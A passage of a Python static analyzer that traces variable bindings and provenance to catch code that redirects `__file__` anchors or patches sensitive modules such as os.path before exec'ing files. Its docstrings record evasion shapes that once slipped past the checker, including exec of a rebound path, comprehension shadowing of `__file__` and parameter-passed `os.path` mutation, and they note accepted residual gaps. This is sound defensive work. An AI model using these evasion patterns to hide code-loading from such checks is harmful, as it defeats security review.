            for d, _ in defs:
                if d.kind != "import":
                    return None
                targets.add(self._import_target(d.node))
            return targets.pop() if len(targets) == 1 and None not in targets else None
        if isinstance(func, ast.Attribute):
            base = self.dotted(func.value, env)
            return f"{base}.{func.attr}" if base else None
        return None

    def canon_func(self, func, env=None):
        d = self.dotted(func, env)
        if d is None:
            return None
        d = re.sub(r"^(posixpath|ntpath)\.", "os.path.", d)
        return d

    # ---- scopes and reaching definitions ----
    def scope_of(self, node):
        n = self.parent.get(node)
        while n is not None and not isinstance(n, _CONTAINMENT_SCOPES):
            n = self.parent.get(n)
        return n or self.tree

    def rd(self, scope):
        if scope not in self._rd:
            self._rd[scope] = _ContainmentReachingDefs(scope, self)
        return self._rd[scope]


class _ContainmentReachingDefs:
    """Flow-sensitive reaching definitions for ONE scope's own body.

    Straight-line code resolves to the binding actually in force at the use site;
    branches merge; a loop back-edge merges its body's bindings into the loop entry,
    so a loop-carried rebinding shows up as a CYCLE in the def chain (-> unbounded)."""

    def __init__(self, scope, ctx):
        self.scope, self.ctx = scope, ctx
        self.uses: dict = {}                 # id(Name Load) -> frozenset(Def)
        self.all_defs: dict = {}             # name -> set(Def) (flow-insensitive, for free vars)
        self.globals, self.nonlocals = set(), set()
        self.local_names: set = set()
        body = scope.body if isinstance(scope, (ast.Module, ast.FunctionDef,
                                                  ast.AsyncFunctionDef, ast.ClassDef)) else [
            ast.Return(value=scope.body)]
        for n in self._own_nodes(body):
            if isinstance(n, ast.Global):
                self.globals.update(n.names)
            elif isinstance(n, ast.Nonlocal):
                self.nonlocals.update(n.names)
        st: dict = {}
        if isinstance(scope, ast.Module):
            st["__file__"] = frozenset({_ContainmentDef("file", None, None, scope)})
            self.local_names.add("__file__")
        if isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
            a = scope.args
            for arg in a.posonlyargs + a.args + a.kwonlyargs + [x for x in (a.vararg, a.kwarg) if x]:
                st[arg.arg] = frozenset({_ContainmentDef("param", arg, None, scope)})
                self.local_names.add(arg.arg)
        for n in self._own_nodes(body):
            for t in self._bound_names(n):
                if t not in self.globals and t not in self.nonlocals:
                    self.local_names.add(t)
        self._block(body, st)

    def _own_nodes(self, stmts):
        stack = list(stmts)
        while stack:
            n = stack.pop()
            yield n
            for c in ast.iter_child_nodes(n):
                if not isinstance(c, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda,
                                       ast.ClassDef)):
                    stack.append(c)

    @staticmethod
    def _bound_names(n):
        if isinstance(n, ast.Name) and isinstance(n.ctx, (ast.Store, ast.Del)):
            return [n.id]
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            return [n.name]
        if isinstance(n, ast.alias):
            return [(n.asname or n.name).split(".")[0]]
        if isinstance(n, ast.ExceptHandler) and n.name:
            return [n.name]
        return []

    def _bind(self, st, name, d):
        if name in self.globals or name in self.nonlocals:
            self.ctx.global_assigns.setdefault(name, set()).add(d)
            return
        st[name] = frozenset({d})
        self.all_defs.setdefault(name, set()).add(d)

    def _bind_merge(self, st, name, d):
        """Like `_bind`, but MERGES with whatever def(s) already reach this point
        instead of REPLACING them (B-850 round 3, W1). A walrus's execution order
        relative to other loads/binds in the SAME statement is not always statically
        provable -- e.g. `exec(open(os.path.join(here, 'x.py'), 'rb').read().decode(),
        {} if (here := os.path.dirname(__file__)) else {})` evaluates the read of
        `here` in argument 1 BEFORE the walrus in argument 2 rebinds it (Python
        evaluates call arguments left to right), so that read must still see the OLD
        `here`, not just the new one. Rather than model call/operator evaluation order
        precisely, a load that might see either value sees BOTH: worst-verdict-wins
        (`_containment_verdict`'s rank ordering) makes this sound in the fail-open
        direction -- merging can only ADD alternatives, never hide a bad one that a
        precise ordering would have kept, and the existing worst-case CONVICT pinned
        tests (walrus read later in the SAME expression) stay convicted either way
        since the malicious alternative is still in the mix."""
        if name in self.globals or name in self.nonlocals:
            self.ctx.global_assigns.setdefault(name, set()).add(d)
            return
        st[name] = st.get(name, frozenset()) | frozenset({d})
        self.all_defs.setdefault(name, set()).add(d)

    def _record(self, node, st):
        """Record the reaching defs of every local Name load in *node* (own scope only)."""
        if node is None:
            return
        stack = [node]
        while stack:
            n = stack.pop()
            if isinstance(n, ast.Name) and isinstance(n.ctx, ast.Load):
                if n.id in self.local_names:
                    prev = self.uses.get(id(n), frozenset())
                    self.uses[id(n)] = prev | st.get(n.id, frozenset())
            if isinstance(n, (ast.Lambda, ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                # decorators/defaults evaluate here; bodies are their own scope
                for c in getattr(n, "decorator_list", []):
                    stack.append(c)
                if hasattr(n, "args"):
                    stack.extend(n.args.defaults)
                    stack.extend([d for d in n.args.kw_defaults if d is not None])
                continue
            if isinstance(n, (ast.ListComp, ast.SetComp, ast.GeneratorExp, ast.DictComp)):
                # comprehension targets are their own scope: treat their names as opaque
                for g in n.generators:
                    stack.append(g.iter)
                continue
            stack.extend(ast.iter_child_nodes(n))

    def _walrus(self, node, st):
        if node is None:
            return
        self._walrus_walk(node, st)

    def _walrus_walk(self, node, st):
        """Bind every walrus in *node* that is guaranteed to run when this statement
        runs -- MERGING each binding (never replacing, see `_bind_merge`) -- while
        SKIPPING subtrees whose execution is genuinely deferred or unreachable, so a
        walrus there is never treated as if it always ran (B-850 round 3, W2-W5):
        a lambda's BODY (bound only if/when the lambda is later called -- but its
        default values, which evaluate eagerly at def time, are still walked), a
        generator expression's elements (lazy: only evaluated on iteration, which may
        never happen -- only the first generator's `.iter` runs eagerly, in the
        enclosing scope), the dead branch of a statically-constant-guarded `and`/`or`
        short circuit, and neither branch of an `IfExp` (exactly one runs; its `test`
        always does)."""
        if isinstance(node, ast.NamedExpr):
            if isinstance(node.target, ast.Name):
                self._bind_merge(st, node.target.id, _ContainmentDef("assign", node.value, None, self.scope))
            self._walrus_walk(node.value, st)
            return
        if isinstance(node, ast.Lambda):
            for d in node.args.defaults:
                self._walrus_walk(d, st)
            for d in node.args.kw_defaults:
                if d is not None:
                    self._walrus_walk(d, st)
            return  # .body is deferred -- never assumed to have run "now"
        if isinstance(node, ast.GeneratorExp):
            if node.generators:
                self._walrus_walk(node.generators[0].iter, st)
            return  # everything else is lazy -- only runs (if ever) on iteration
        if isinstance(node, ast.IfExp):
            self._walrus_walk(node.test, st)
            return  # exactly one of body/orelse runs -- neither is guaranteed
        if isinstance(node, ast.BoolOp):
            is_and = isinstance(node.op, ast.And)
            for v in node.values:
                self._walrus_walk(v, st)
                if isinstance(v, ast.Constant) and (
                    (is_and and not v.value) or (not is_and and v.value)
                ):
                    break  # statically-proven short circuit -- later operands are dead
            return
        for c in ast.iter_child_nodes(node):
            self._walrus_walk(c, st)

    def _assign_target(self, st, t, value, kind="assign"):
        if isinstance(t, ast.Name):
            self._bind(st, t.id, _ContainmentDef(kind, value, None, self.scope))
        elif isinstance(t, (ast.Tuple, ast.List)):
            for i, e in enumerate(t.elts):
                if isinstance(e, ast.Starred):
                    for m in ast.walk(e):
                        if isinstance(m, ast.Name) and isinstance(m.ctx, ast.Store):
                            self._bind(st, m.id, _ContainmentDef("opaque", e, None, self.scope))
                else:
                    if isinstance(e, ast.Name):
                        self._bind(
                            st, e.id,
                            _ContainmentDef(kind + "-unpack", value, (i, len(t.elts)), self.scope),
                        )
                    else:
                        self._assign_target(st, e, None, "opaque")

    @staticmethod
    def _merge(*states):
        out: dict = {}
        for s in states:
            for k, v in s.items():
                out[k] = out.get(k, frozenset()) | v
        return out

    def _block(self, stmts, st, trace=None):
        for s in stmts:
            st = self._stmt(s, st)
            if trace is not None:
                trace.append(dict(st))
        return st

    def _stmt(self, s, st):
        st = dict(st)
        if isinstance(s, ast.Assign):
            self._walrus(s.value, st)
            self._record(s.value, st)
            for t in s.targets:
                self._record(t, st)  # subscript/attribute targets read names
            for t in s.targets:
                self._assign_target(st, t, s.value)
        elif isinstance(s, ast.AugAssign):
            self._walrus(s.value, st)
            self._record(s.value, st)
            if isinstance(s.target, ast.Name):
                prior = st.get(s.target.id, frozenset())
                self._bind(st, s.target.id, _ContainmentDef("aug", s, prior, self.scope))
        elif isinstance(s, ast.AnnAssign):
            if s.value is not None:
                self._walrus(s.value, st)
                self._record(s.value, st)
            if s.value is not None and isinstance(s.target, ast.Name):
                self._bind(st, s.target.id, _ContainmentDef("assign", s.value, None, self.scope))
        elif isinstance(s, (ast.Import, ast.ImportFrom)):
            for a in s.names:
                self._bind(
                    st, (a.asname or a.name).split(".")[0],
                    _ContainmentDef("import", a, None, self.scope),
                )
        elif isinstance(s, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            # Decorators/defaults evaluate in THIS scope (the body is its own scope,
            # matching `_record`'s own special-case for these node types below) -- a
            # walrus in either is bound here, before recording, same as everywhere
            # else (B-850 round 2).
            for c in getattr(s, "decorator_list", []):
                self._walrus(c, st)
            if hasattr(s, "args"):
                for d in s.args.defaults:
                    self._walrus(d, st)
                for d in s.args.kw_defaults:
                    if d is not None:
                        self._walrus(d, st)
            self._record(s, st)
            self._bind(st, s.name, _ContainmentDef("def", s, None, self.scope))
        elif isinstance(s, ast.If):
            self._walrus(s.test, st)
            self._record(s.test, st)
            st = self._merge(self._block(s.body, st), self._block(s.orelse, st))
        elif isinstance(s, (ast.For, ast.AsyncFor, ast.While)):
            head = s.iter if isinstance(s, (ast.For, ast.AsyncFor)) else s.test
            entry = st
            for _ in range(8):  # def-site sets are finite and monotone: converges
                self._walrus(head, entry)
                self._record(head, entry)
                loop = dict(entry)
                if isinstance(s, (ast.For, ast.AsyncFor)):
                    self._assign_target(loop, s.target, s.iter, "for")
                after = self._block(s.body, loop)
                nxt = self._merge(entry, after)
                if nxt == entry:
                    break
                entry = nxt
            st = self._block(s.orelse, entry)
            st = self._merge(st, entry)
        elif isinstance(s, (ast.With, ast.AsyncWith)):
            for item in s.items:
                self._walrus(item.context_expr, st)
                self._record(item.context_expr, st)
                if item.optional_vars is not None:
                    self._assign_target(st, item.optional_vars, item.context_expr, "with")
            st = self._block(s.body, st)
        elif isinstance(s, ast.Try) or s.__class__.__name__ == "TryStar":
            trace = [dict(st)]
            body_end = self._block(s.body, st, trace)
            anywhere = self._merge(*trace)
            ends = [self._block(s.orelse, body_end)]
            for h in s.handlers:
                hs = dict(anywhere)
                if h.name:
                    self._bind(hs, h.name, _ContainmentDef("opaque", h, None, self.scope))
                ends.append(self._block(h.body, hs))
            st = self._merge(*ends)
            st = self._block(s.finalbody, st)
        elif s.__class__.__name__ == "Match":
            self._walrus(s.subject, st)
            self._record(s.subject, st)
            ends = [st]
            for case in s.cases:
                cs = dict(st)
                for m in ast.walk(case.pattern):
                    nm = getattr(m, "name", None)
                    if isinstance(nm, str):
                        self._bind(cs, nm, _ContainmentDef("opaque", m, None, self.scope))
                ends.append(self._block(case.body, cs))
            st = self._merge(*ends)
        elif isinstance(s, ast.Delete):
            for t in s.targets:
                if isinstance(t, ast.Name):
                    st[t.id] = frozenset()
                else:
                    self._record(t, st)
        else:
            for c in ast.iter_child_nodes(s):
                if isinstance(c, ast.expr):
                    self._walrus(c, st)
            self._record(s, st)
        return st


# ---- evaluation --------------------------------------------------------------
class _ContainmentEnv:
    def __init__(self, ctx, scope, params=None, depth=0, helper_stack=()):
        self.ctx, self.scope, self.params = ctx, scope, params or {}
        self.depth, self.helper_stack = depth, helper_stack
        self.hops = [0]  # shared mutable hop counter


def _containment_node_within(node, container):
    return any(node is m for m in ast.walk(container))


def _containment_comp_iters(name_node, ctx):
    """`.iter` nodes of every enclosing comprehension generator whose `for` target
    binds *name_node*'s id -- a comprehension is its own scope in real Python and
    ALWAYS shadows an outer/module binding of the same name (B-850 round 2). The
    flow-insensitive free-name fallback below cannot see this on its own:
    `_ContainmentReachingDefs._record` deliberately treats a comprehension body as
    opaque (its own scope), so a Name load inside one is never in `rd.uses`, and
    without this check it fell through to the flow-insensitive module-level
    `all_defs` -- which is how `[exec(...) for __file__ in ['/tmp/e/y.py']]` used to
    resolve `__file__` straight to the real module-level anchor. A name used in the
    FIRST generator's own `iter` is excluded: that one expression evaluates in the
    ENCLOSING scope, before the comprehension's own scope exists, matching real
    Python.

    A `Lambda` does NOT stop this walk (B-850 round 3, L1): `[(lambda: open(...))()
    for open in [...]]` captures the comprehension's `open` as a FREE name inside the
    lambda body -- the lambda only shadows names that are actually its OWN parameters.
    Only a genuinely shadowing lambda parameter (or a real scope boundary that isn't a
    lambda) stops the walk."""
    name = name_node.id
    out = []
    n = name_node
    parent = ctx.parent
    while True:
        p = parent.get(n)
        if p is None:
            return out
        if isinstance(p, ast.Lambda):
            a = p.args
            lambda_params = [x.arg for x in a.posonlyargs + a.args + a.kwonlyargs]
            lambda_params += [x.arg for x in (a.vararg, a.kwarg) if x]
            if name in lambda_params:
                return out  # shadowed by the lambda's own parameter
            n = p
            continue  # free name -- keep walking up through the lambda
        if isinstance(p, _CONTAINMENT_SCOPES):
            return out
        if isinstance(p, _CONTAINMENT_COMP_TYPES):
            value_parts = [p.elt] if hasattr(p, "elt") else [p.key, p.value]
            eligible = (
                any(_containment_node_within(name_node, v) for v in value_parts)
                or any(_containment_node_within(name_node, i)
                       for g in p.generators for i in g.ifs)
                or any(_containment_node_within(name_node, g.iter) for g in p.generators[1:])
            )
            if eligible:
                for g in p.generators:
                    for t in ast.walk(g.target):
                        if isinstance(t, ast.Name) and t.id == name:
                            out.append(g.iter)
        n = p


def _containment_lookup(name_node, env, visited):
    ctx, rd = env.ctx, env.ctx.rd(env.scope)
    name = name_node.id
    comp_iters = _containment_comp_iters(name_node, ctx)
    if comp_iters:
        # A comprehension-local binding always shadows an outer/module name of the
        # same spelling -- resolve through its iterable, exactly like a real `for`
        # loop target (kind "for" already means "resolve via `_containment_ev_iter`
        # of this node"), and never fall through to the free-name/module lookup
        # below.
        return [(_ContainmentDef("for", it, None, env.scope), env) for it in comp_iters]
    if name in rd.local_names and id(name_node) in rd.uses:
        defs = rd.uses[id(name_node)]
        out = [(d, env) for d in defs]
        if isinstance(env.scope, ast.Module):
            for d in ctx.global_assigns.get(name, ()):
                genv = _ContainmentEnv(ctx, d.scope, depth=env.depth, helper_stack=env.helper_stack)
                genv.hops = env.hops
                out.append((d, genv))
        return out
    # free / global name: resolve in the lexical parent, flow-insensitively, STRICT-only
    out = _containment_free_defs(name, env)
    if not isinstance(env.scope, ast.Module):
        # strict mode: a function may only borrow immutable-ish module bindings
        out = [(d, e) if d.kind in ("import", "def", "file") else
               (_ContainmentDef("opaque", None, None, env.scope), env) for d, e in out]
    return out


def _containment_free_defs(name, env):
    ctx = env.ctx
    scope = env.scope
    rd = ctx.rd(scope)
    if name in rd.globals or isinstance(scope, ast.Module):
        target = ctx.tree
    else:
        target = ctx.scope_of(scope)
        while isinstance(target, ast.ClassDef):
            target = ctx.scope_of(target)
    out = []
    trd = ctx.rd(target)
    if name in trd.local_names or isinstance(target, ast.Module):
        denv = _ContainmentEnv(ctx, target, depth=env.depth, helper_stack=env.helper_stack)
        denv.hops = env.hops
        for d in trd.all_defs.get(name, ()):
            out.append((d, denv))
        if isinstance(target, ast.Module):
            if name == "__file__":
                out.append((_ContainmentDef("file", None, None, target), denv))
            for d in ctx.global_assigns.get(name, ()):
                genv = _ContainmentEnv(ctx, d.scope, depth=env.depth, helper_stack=env.helper_stack)
                genv.hops = env.hops
                out.append((d, genv))
        if not out and not isinstance(target, ast.Module):
            return _containment_free_defs(name, denv)
        return out
    return _containment_free_defs(name, _ContainmentEnv(ctx, target, depth=env.depth, helper_stack=env.helper_stack))


def _containment_eval_def(d, denv, visited, name):
    key = (d.kind, id(d.node), id(d.scope), name, id(denv.params) if denv.params else 0)
    if key in visited:
        return [_ContainmentOpq("runtime", f"'{name}' is rebound in a loop (cycle)")]
    denv.hops[0] += 1
    if denv.hops[0] > _CONTAINMENT_MAX_WORK:
        raise _ContainmentBudget("total work")
    if len(visited) >= _CONTAINMENT_MAX_HOPS:
        raise _ContainmentBudget("name-chain hops")
    visited = visited | {key}
    k = d.kind
    if k == "file":
        return [_containment_pv("anchor", comps=denv.ctx.file_comps, why="__file__")]
    if k == "assign":
        return _containment_ev(d.node, denv, visited)
    if k == "assign-unpack":
        i, n = d.extra
        if isinstance(d.node, (ast.Tuple, ast.List)) and len(d.node.elts) == n and not any(
            isinstance(e, ast.Starred) for e in d.node.elts
        ):
            return _containment_ev(d.node.elts[i], denv, visited)
        if isinstance(d.node, ast.Call) and denv.ctx.canon_func(d.node.func, denv) == "os.path.split" \
                and n == 2 and i == 0 and len(d.node.args) == 1:
            return [_containment_dirname(v, "os") for v in _containment_ev(d.node.args[0], denv, visited)]
        return [_ContainmentOpq("runtime", "tuple-unpacked value")]
    if k == "aug":
        s = d.node
        prior = []
        for pd in d.extra:
            prior += _containment_eval_def(pd, denv, visited, name)
        if not d.extra:
            return [_ContainmentOpq("runtime", "augmented assignment to an unbound name")]
        rhs = _containment_ev(s.value, denv, visited)
        if isinstance(s.op, ast.Add):
            return _containment_dedupe([_containment_concat(a, b) for a in prior for b in rhs])
        if isinstance(s.op, ast.Div):
            return _containment_dedupe([_containment_join([a, b], "pathlib") for a in prior for b in rhs])
        return [_ContainmentOpq("runtime", "augmented assignment")]
    if k == "param":
        if name in denv.params:
            arg, cenv = denv.params[name]
            return _containment_ev(arg, cenv, visited)
        return [_ContainmentOpq("runtime", f"parameter '{name}'")] + _containment_callsite_args(
            d.scope, name, denv, visited
        )
    if k == "for":
        return _containment_ev_iter(d.node, denv, visited)
    if k in ("with", "with-unpack", "for-unpack"):
        return [_ContainmentOpq("runtime", "handle / loop-unpacked value")]
    if k == "def":
        return [_ContainmentOpq("unrecognized", f"function object '{name}'")]
    return [_ContainmentOpq("unrecognized" if k == "import" else "runtime", f"{k} binding of '{name}'")]


def _containment_callsites(fn, ctx):
    if fn not in ctx._callsites:
        sites = []
        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for n in ast.walk(ctx.tree):
                if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == fn.name:
                    env = _ContainmentEnv(ctx, ctx.scope_of(n))
                    try:
                        defs = _containment_lookup(n.func, env, frozenset())
                    except _ContainmentBudget:
                        continue
                    if any(d.kind == "def" and d.node is fn for d, _ in defs):
                        sites.append(n)
        ctx._callsites[fn] = sites
    return ctx._callsites[fn]


def _containment_own_returns(fn):
    """`ast.Return` nodes belonging to *fn* itself, not any nested function/lambda/
    class -- same own-scope walk shape as `_ContainmentReachingDefs._own_nodes`, used
    to trace what a called function's result actually is (B-850 round 5, G4: the
    provenance walker's `Call` branch used to never look at what a user-defined
    function's own `return` evaluates to)."""
    out = []
    stack = list(fn.body)
    while stack:
        n = stack.pop()
        if isinstance(n, ast.Return):
            out.append(n)
            continue
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda, ast.ClassDef)):
            continue
        stack.extend(ast.iter_child_nodes(n))
    return out


def _containment_provenance_defs(name_node, env):
    """Like `_containment_lookup`, but returns the RAW reaching defs for a free/
    global name WITHOUT the STRICT-mode kind rewrite to 'opaque' (B-850 round 4,
    H1). `_containment_lookup`'s strict rewrite exists to answer 'is this the
    value NOW, from inside a function that can't trust a module-level rebind' --
    a different question from provenance tracing's 'could this value EVER be
    import-derived', which needs the real originating kind (an 'assign' from
    `os.path` is exactly what must not be waved through as safe merely because a
    function borrows it as a free variable)."""
    ctx, rd = env.ctx, env.ctx.rd(env.scope)
    name = name_node.id
    comp_iters = _containment_comp_iters(name_node, ctx)
    if comp_iters:
        return [(_ContainmentDef("for", it, None, env.scope), env) for it in comp_iters]
    if name in rd.local_names and id(name_node) in rd.uses:
        defs = rd.uses[id(name_node)]
        out = [(d, env) for d in defs]
        if isinstance(env.scope, ast.Module):
            for d in ctx.global_assigns.get(name, ()):
                genv = _ContainmentEnv(ctx, d.scope, depth=env.depth, helper_stack=env.helper_stack)
                genv.hops = env.hops
                out.append((d, genv))
        return out
    return _containment_free_defs(name, env)


def _containment_is_receiver_param(ctx, node):
    """True if *node* (a Name, Load ctx) is the RECEIVER parameter (self/cls,
    however spelled) of the method it's used in -- structurally, the first
    positional parameter of a FunctionDef/AsyncFunctionDef that is itself a
    direct child of a ClassDef body, not a @staticmethod, and STILL bound to
    that original parameter at this use site (never a local rebind like
    `self = os.path`). This binding is never a value-aliasing target the way an
    ordinary parameter is -- it denotes 'this instance' -- so provenance tracing
    on it is meaningless and it is always treated as safe (B-850 round 4),
    preserving round 3's FP2/FP3 (`setattr(self, k, v)`/`self.__dict__.update
    (kw)`) exemption while an ordinary explicit parameter (H2's `mod`) still
    gets full call-site provenance tracing below."""
    if not isinstance(node, ast.Name):
        return False
    scope = ctx.scope_of(node)
    if not isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef)):
        return False
    owner = ctx.parent.get(scope)
    if not isinstance(owner, ast.ClassDef):
        return False
    decorators = {d.id for d in scope.decorator_list if isinstance(d, ast.Name)}
    decorators |= {d.attr for d in scope.decorator_list if isinstance(d, ast.Attribute)}
    if "staticmethod" in decorators:
        return False
    a = scope.args
    positional = a.posonlyargs + a.args
    if not positional or positional[0].arg != node.id:
        return False
    rd = ctx.rd(scope)
    if id(node) in rd.uses:
        return {d.kind for d in rd.uses[id(node)]} == {"param"}
    return True


_CONTAINMENT_PROVENANCE_MAX_DEPTH = 6
_CONTAINMENT_TRIVIALLY_SAFE_TYPES = (ast.Constant, ast.JoinedStr, ast.FormattedValue, ast.Lambda)
_CONTAINMENT_MRO_MAX_DEPTH = 6


def _containment_resolve_base_class(ctx, base_node, class_node):
    """One element of `class_node.bases` resolved to an in-file `ClassDef`, or
    None when it isn't a bare `ast.Name` bound to EXACTLY one in-file class def
    (an imported base, a dynamic/computed base, an ambiguous/multi-candidate
    binding, budget exhaustion, ...) -- same "opaque base stays out of scope,
    never resolved" philosophy as `_containment_resolve_constructed_class`
    (B-850 round 6). Evaluated in the scope ENCLOSING *class_node* (where the
    `class Foo(Bar):` statement itself lives), not inside the class body --
    bases can't see the class's own not-yet-created namespace."""
    if not isinstance(base_node, ast.Name):
        return None
    env = _ContainmentEnv(ctx, ctx.scope_of(class_node))
    try:
        defs = _containment_provenance_defs(base_node, env)
    except _ContainmentBudget:
        return None
    class_defs = [dd for dd, _ in defs if dd.kind == "def" and isinstance(dd.node, ast.ClassDef)]
    if len(defs) != 1 or len(class_defs) != 1:
        return None
    return class_defs[0].node


def _containment_class_attr_is_safe(ctx, class_node, attr, visited=None, depth=0):
    """True unless some assignment `<receiver>.<attr> = <value>` anywhere in
    *class_node*'s own methods, OR anywhere in an in-file base class it
    transitively inherits from (B-850 round 6, see below), fully resolves its
    <value> to a sensitive dotted name. Shared (B-850 round 5, G5) between
    `_containment_self_attr_is_safe` (accessed via self/receiver-param, from
    INSIDE the class -- B-850 round 4, H5) and an access on an instance
    obtained from a traced constructor call, from OUTSIDE the class (`w =
    Wrapper(); w.mod.join = ...` is the same shape as H5's `self.mod...`, one
    method over -- H5's fix only covered the inside-the-class case).
    Deliberately narrower than `_containment_target_is_safe`'s general
    ambiguous-fires rule: an unresolved/opaque RHS (a constructor parameter, a
    computed value, ...) stays SAFE here -- only a PROVEN-sensitive assignment
    convicts -- so the common `self.<anything> = <ordinary value>` shape
    (FP1-FP11) never regresses just because the whole class isn't traceable.
    (AugAssign-to-attribute, e.g. `self.mod += os.path`, is not chased -- an
    accepted, narrow residual for a shape no real skill writes.)

    B-850 round 6 (C-135 rejection of 92de73e4): this used to walk ONLY
    `class_node.body`, never `class_node.bases` -- so `self.mod = os.path` set
    in a PARENT's `__init__`, read/mutated off a CHILD instance one level of
    inheritance removed (`class Wrapper(Base): pass`), found nothing in the
    child's own (empty) body and fell through to True -- the exact H5/G5 shape
    reopened one hop away. Round 6 fixed that by walking `class_node.bases`
    too: a base that resolves (via `_containment_resolve_base_class`) to an
    in-file ClassDef is recursed into for the SAME attribute, transitively,
    bounded by `_CONTAINMENT_MRO_MAX_DEPTH` and the `visited` cycle guard (a
    class can't syntactically inherit from itself in valid Python, but
    resolution here is purely static/AST-based -- `class A(A):` resolves the
    free name `A` right back to itself, so the guard matters).

    B-850 round 7 (C-135 rejection of the round-6 commit): round 6 ALSO made an
    unresolvable base (imported from elsewhere, a dynamic/computed base, more
    than one candidate) OR a depth-budget exhaustion flip the WHOLE function's
    result to not-safe -- confirmed live to convict ordinary code with no
    sensitive assignment anywhere: `class ConfigDict(dict): ...` or `class
    Base(Exception): ...` where every `self.<attr> = <value>` in the entire
    resolvable hierarchy is a plain literal, purely because `dict`/`Exception`
    themselves don't resolve to an in-file `ClassDef`; likewise a benign chain
    that happens to be `_CONTAINMENT_MRO_MAX_DEPTH` or more levels deep flipped
    to not-safe purely because the budget ran out before the walk finished, not
    because anything sensitive was found. That conflates "couldn't finish
    proving safe" with "proven unsafe" -- this function's own contract (the
    paragraph above) is narrower than that: only a PROVEN-sensitive assignment
    convicts. Now: an unresolvable base or an exhausted depth budget contributes
    NO INFORMATION -- it's skipped, exactly like any other base this walker
    can't see into, and the function returns True once every RESOLVABLE base
    (plus the class's own body) came back with nothing sensitive. `object` --
    the implicit base of every class, or an explicit `class Foo(object):` --
    was never opaque in the first place and is unaffected: a class with no
    bases, or only `object`, still behaves exactly as before round 6 (own body
    only). This is a deliberate, narrower trade-off, not a compromise: a
    sensitive assignment deliberately hidden behind a genuinely unresolvable
    base (imported from another file, dynamic, or more than
    `_CONTAINMENT_MRO_MAX_DEPTH` levels deep) can again go undetected -- but
    that is the SAME single-file-analysis boundary this whole recognizer
    already accepts everywhere else (an unresolved RHS is safe-by-design per
    the paragraph above), not a new category of gap, and it is far narrower
    than "any class with any out-of-file base whatsoever."""
    if visited is None:
        visited = set()
    if id(class_node) in visited:
        return False
    visited = visited | {id(class_node)}

    for meth in class_node.body:
        if not isinstance(meth, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        margs = meth.args.posonlyargs + meth.args.args
        if not margs:
            continue
        recv_name = margs[0].arg
        for n in ast.walk(meth):
            if not (
                isinstance(n, ast.Attribute) and n.attr == attr
                and isinstance(n.ctx, ast.Store)
                and isinstance(n.value, ast.Name) and n.value.id == recv_name
            ):
                continue
            assign = ctx.parent.get(n)
            value = None
            if isinstance(assign, ast.Assign) and any(n is t for t in assign.targets):
                value = assign.value
            elif isinstance(assign, ast.AnnAssign) and assign.target is n:
                value = assign.value
            if value is None:
                continue
            menv = _ContainmentEnv(ctx, meth)
            resolved = _containment_resolve_through_assigns(ctx, value, menv)
            if resolved is not None and _containment_dotted_is_sensitive(resolved):
                return False

    for b in class_node.bases:
        if isinstance(b, ast.Name) and b.id == "object":
            continue  # the universal implicit base -- contributes nothing
        if depth >= _CONTAINMENT_MRO_MAX_DEPTH:
            # Budget exhausted with a real base still unwalked -- no information
            # about it either way, not proof of a sensitive assignment (round 7).
            continue
        base_class = _containment_resolve_base_class(ctx, b, class_node)
        if base_class is None:
            # Imported / dynamic / ambiguous base -- can't see into it, but "can't
            # see" isn't "proven sensitive" (round 7): contributes no information.
            continue
        if not _containment_class_attr_is_safe(ctx, base_class, attr, visited, depth + 1):
            return False
    return True


def _containment_self_attr_is_safe(ctx, node, env, visited, depth):
    """*node* is `<receiver>.<attr>` (e.g. `self.mod`) -- resolves the enclosing
    class and delegates the actual per-attribute check to
    `_containment_class_attr_is_safe` (B-850 round 4, H5; refactored round 5 to
    share that check with the external-access case, G5)."""
    receiver_scope = ctx.scope_of(node.value)
    class_node = ctx.parent.get(receiver_scope)
    if not isinstance(class_node, ast.ClassDef):
        return False
    return _containment_class_attr_is_safe(ctx, class_node, node.attr)


def _containment_param_is_safe(ctx, dd, denv, visited, depth):
    """A non-receiver parameter is safe only when EVERY in-file call site passes
    it a provably-safe value -- zero discoverable call sites (or more than the
    evaluated-callsite budget) is treated as ambiguous, not safe (B-850 round 4,
    H2: `def mutate(mod): mod.join = ...; mutate(os.path)` must fire; a
    parameter with no traceable call site fires for the same reason -- a
    fail-closed guard can't positively vouch for a value it never saw).

    KNOWN FP, deliberately NOT fixed here (B-850 round 5, reviewed and deferred):
    `names` only covers `posonlyargs`/`args`, so a reaching-def for a `*args`/
    `**kwargs` COLLECTOR PARAMETER ITSELF (not one of its unpacked elements,
    e.g. `def f(*args): args[0].path = x`) always falls through the `arg is
    None` check below and is treated as not-safe -- a real false-positive on
    ordinary code. The obvious one-line fix (append `vararg`/`kwarg` to `names`)
    is UNSOUND, not just cosmetic: it maps the collector name to `call.args[0]`
    positionally, so for a multi-argument call it only vouches for the FIRST
    excess positional and silently stops looking at the rest -- verified live:
    `def f(*args): args[1].join = ...; f('benign', os.path)` goes CLEAN under
    that patch (the `_ContainmentDef` for `args[1]` is `os.path`, a real bypass)
    because `args[0]` alone was checked. Soundly fixing this needs collecting
    ALL excess positional/keyword args across every call site and requiring
    them ALL safe (the same `all(...)` shape as the List/Tuple-literal branch
    of `_containment_target_is_safe`, not a single-index lookup here) -- out of
    scope for this round; the FP stays an accepted, understood residual until a
    round budgeted for that rewrite."""
    fn = dd.scope
    if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
        return False
    pname = dd.node.arg if isinstance(dd.node, ast.arg) else None
    if pname is None:
        return False
    sites = _containment_callsites(fn, ctx)
    if not sites or len(sites) > _CONTAINMENT_MAX_CALLSITES:
        return False
    a = fn.args
    names = [p.arg for p in a.posonlyargs + a.args]
    for call in sites:
        arg = None
        if pname in names:
            idx = names.index(pname)
            if any(isinstance(x, ast.Starred) for x in call.args[:idx + 1]):
                return False
            if idx < len(call.args):
                arg = call.args[idx]
        for kw in call.keywords:
            if kw.arg == pname:
                arg = kw.value
            elif kw.arg is None:
